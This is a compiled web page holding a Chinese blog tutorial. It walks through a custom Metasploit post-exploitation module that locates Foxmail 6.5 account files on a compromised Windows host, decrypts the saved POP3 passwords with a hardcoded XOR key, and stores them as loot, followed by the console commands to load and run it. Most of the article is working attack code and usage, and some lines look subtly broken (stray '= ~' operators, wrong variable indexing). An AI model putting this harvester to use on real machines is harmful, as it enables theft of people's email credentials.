import{i as e,r as t,s as n,t as r}from"./app-DDh9ajWo.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-001-Metasploit%E8%87%AA%E5%AE%9A%E4%B9%89%E6%94%B6%E9%9B%86%E7%99%BB%E5%BD%95%E5%87%AD%E8%AF%81%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97.html","title":"Metasploit自定义收集登录凭证的后渗透模块","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit自定义收集登录凭证的后渗透模块","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit自定义收集登录凭证的后渗透模块","lock":"need"},"git":{"updatedTime":1777452223000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"b322b7352fc70ae7e8fe9dc99f96f0030ecd3d81","time":1777452223000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-001-Metasploit自定义收集登录凭证的后渗透模块.md"}`),a={name:`2022-05-02-001-Metasploit自定义收集登录凭证的后渗透模块.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit自定义收集登录凭证的后渗透模块" tabindex="-1"><a class="header-anchor" href="#metasploit自定义收集登录凭证的后渗透模块"><span>Metasploit自定义收集登录凭证的后渗透模块</span></a></h1><p>这里，我们以攻击Foxmail 6.5为例，将尝试对登录凭证进行解密，然后将它保存到数据库。</p><p><strong>注意：运行这个脚本的前提是我们已经经过一系列的渗透拿下了目标Windows系统的System权限。</strong></p><p>这里，我们编写脚本foxmail_decrypt_by_binghe.rb，内容如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-13</span>
<span class="line"># Description 对foxmail 6.5的登录凭证进行解密</span>
<span class="line">#</span>
<span class="line"># 实现过程如下：</span>
<span class="line"># 1.搜索用户的文件，查找当前用户的LocalAppData文件夹的准确位置</span>
<span class="line"># 2.使用上面找到的文职，并将其与\\VirtualStore\\Program Files(x86)\\Tencent\\Foxmail\\mail连接，建立一个mail文件夹的完整路径</span>
<span class="line"># 3.列出mail文件夹下的所有文件夹，并将它们都保存到一个数组中。在mail文件夹中的每一个文件夹的名字都对应着一个邮箱用户名，比如binghe@formail.com就可以是mail文件夹下的一个文件夹</span>
<span class="line"># 4.在mail文件夹下的accounts文件中查找Account.stg文件</span>
<span class="line"># 5.通过读取Account.stg文件，会发现名为POP3Password的哈希</span>
<span class="line"># 6.将这个值传递给解密方法，然后就会得到明文密码</span>
<span class="line"># 7.将这些值保存到数据库</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line"></span>
<span class="line">class Metasploit3 &lt; Msf::Post</span>
<span class="line">  include Msf::Post::Windows::Registry</span>
<span class="line">  include Msf::Post::File</span>
<span class="line">  include Msf::Auxiliary::Report</span>
<span class="line">  include Msf::Post::Windows::UserProfiles</span>
<span class="line">  </span>
<span class="line">  def initialize(info={})</span>
<span class="line">    super(update_info(info,</span>
<span class="line">      &#39;Name&#39;          =&gt; &#39;Foxmail 6.5 Credential Harvester&#39;,</span>
<span class="line">      &#39;Description&#39;   =&gt; %q{</span>
<span class="line">          This module Finds and Decrypts Stored Foxmail 6.5 Credentials</span>
<span class="line">       },</span>
<span class="line">       &#39;License&#39;      =&gt; MSF_LICENSE,</span>
<span class="line">       &#39;Author&#39;       =&gt; [&#39;binghe&#39;],</span>
<span class="line">       &#39;Platform&#39;     =&gt; [&#39;Windows&#39;],</span>
<span class="line">       &#39;SessionTypes&#39; =&gt; [&#39;Meterpreter&#39;]</span>
<span class="line">    ))</span>
<span class="line">    end</span>
<span class="line">    </span>
<span class="line">    #程序入口</span>
<span class="line">    def run</span>
<span class="line">      profile = grap_user_profiles()</span>
<span class="line">      counter = 0</span>
<span class="line">      data_entry = &quot;&quot;</span>
<span class="line">      profile.each do |user|</span>
<span class="line">        if user[&#39;LocalAppData&#39;]</span>
<span class="line">          full_path = user[&#39;LocalAppData&#39;]</span>
<span class="line">          full_path = full_path + &quot;\\\\VirtualStore\\\\Program Files(x86)\\\\Tencent\\\\Foxmail\\\\mail&quot;</span>
<span class="line">          if directory?(full_path)</span>
<span class="line">            print_good(&quot;Fox Mail Installed, Enumerating Mail Accounts&quot;)</span>
<span class="line">            session.fs.dir.foreach(full_path) do |dir_list|</span>
<span class="line">            if dir_list = ~/@/</span>
<span class="line">              counter = counter + 1</span>
<span class="line">              full_path_mail = full_path + &quot;&quot; + dir_list + &quot;&quot; + &quot;Account.stg&quot;</span>
<span class="line">              if file?(full_path_mail)</span>
<span class="line">                print_good(&quot;Reading Mail Account #{counter}&quot;)</span>
<span class="line">                file_content = read_file(full_path_mail).split(&quot;\\n&quot;)</span>
<span class="line">                file_content.each do |hash|</span>
<span class="line">                if hash = ~/POP3Password/</span>
<span class="line">                  hash_data = hash.split(&quot;=&quot;)</span>
<span class="line">                  hash_value = hash[1]</span>
<span class="line">                  if hash_value.nil?</span>
<span class="line">                    print_error(&quot;No Saved Password&quot;)</span>
<span class="line">                  else</span>
<span class="line">                    print_good(&quot;Decrypting Password for mail account: #{dir_list}&quot;)</span>
<span class="line">                    #调用解密方法进行解密</span>
<span class="line">                    decrypted_pass = decrypt(hash_value, dir_list)</span>
<span class="line">                    data_entry &lt;&lt; &quot;Username:&quot; + dir_list + &quot;\\t&quot; + &quot;Password:&quot; + decrypted_pass + &quot;\\n&quot;</span>
<span class="line">                  end</span>
<span class="line">                 end</span>
<span class="line">                end</span>
<span class="line">               end</span>
<span class="line">              end</span>
<span class="line">             end</span>
<span class="line">            end</span>
<span class="line">           end</span>
<span class="line">          end</span>
<span class="line">          store_loot(&quot;Foxmail Accounts&quot;, &quot;text/plain&quot;, session, data_entry, &quot;Fox.txt&quot;, &quot;Fox Mail Accounts&quot;) </span>
<span class="line">      end  </span>
<span class="line">      </span>
<span class="line">      #解密方法</span>
<span class="line">      def decrypt(hash_real, dir_list)</span>
<span class="line">        decoded = &quot;&quot;</span>
<span class="line">        magic = Array[126,100,114,97,71,111,110,126]</span>
<span class="line">        fc0 = 90</span>
<span class="line">        size = (hash_real.length) / 2 - 1</span>
<span class="line">        index = 0</span>
<span class="line">        b = Array.new(size)</span>
<span class="line">        for i in 0 .. size do</span>
<span class="line">         b[i] = (hash_real[index, 2]).hex</span>
<span class="line">         index = index + 2</span>
<span class="line">        end</span>
<span class="line">        b[0] = b[0] ^ fc0</span>
<span class="line">        double_magic = magic + magic</span>
<span class="line">        d = Array.new(b.length - 1)</span>
<span class="line">        for i in 1 .. b.length - 1 do</span>
<span class="line">          d[i-1] = b[i] ^ double_magic[i - 1]</span>
<span class="line">        end</span>
<span class="line">        </span>
<span class="line">        e = Array.new(d.length)</span>
<span class="line">        for i in 0 .. (d.length -1)</span>
<span class="line">          if(d[i] - b[i] &lt; 0)</span>
<span class="line">            e[i] = d[i] + 255 - b[i]</span>
<span class="line">           else</span>
<span class="line">            e[i] = d[i] - b[i]</span>
<span class="line">           end</span>
<span class="line">           decoded &lt;&lt; e[i].chr</span>
<span class="line">         end</span>
<span class="line">         print_good(&quot;Found Username #{dir_list} with Password: #{decoded}&quot;)</span>
<span class="line">         return decoded</span>
<span class="line">       end</span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后我们将foxmail_decrypt_by_binghe.rb脚本上传到Kali的/usr/share/metasploit-framework/modules/post/windows/gather/credentials目录下。</p><p>在运行这个脚本之前，我们先使用Metasploit中的msftidy工具检查一下此脚本的语法是否正确。</p><p>在Kali的命令行执行如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">/usr/share/metasploit-framework/tools/dev/msftidy.rb /usr/share/metasploit-framework/modules/post/windows/gather/credentials/foxmail_decrypt_by_binghe.rb</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>未输出任何信息，证明脚本正确。</p><p>接下来，我们的Kali命令行，执行如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; background</span>
<span class="line">msf &gt; set SESSION 1</span>
<span class="line">msf &gt; use post/windows/gather/credentials/foxmail_decrypt_by_binghe </span>
<span class="line">msf post(windows/gather/credentials/foxmail_decrypt_by_binghe) &gt; show options</span>
<span class="line"></span>
<span class="line">Module options (post/windows/gather/credentials/foxmail_decrypt_by_binghe):</span>
<span class="line"></span>
<span class="line">   Name     Current Setting  Required  Description</span>
<span class="line">   ----     ---------------  --------  -----------</span>
<span class="line">   SESSION                   yes       The session to run this module on.</span>
<span class="line"></span>
<span class="line">msf post(windows/gather/credentials/foxmail_decrypt_by_binghe) &gt; run</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,15)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};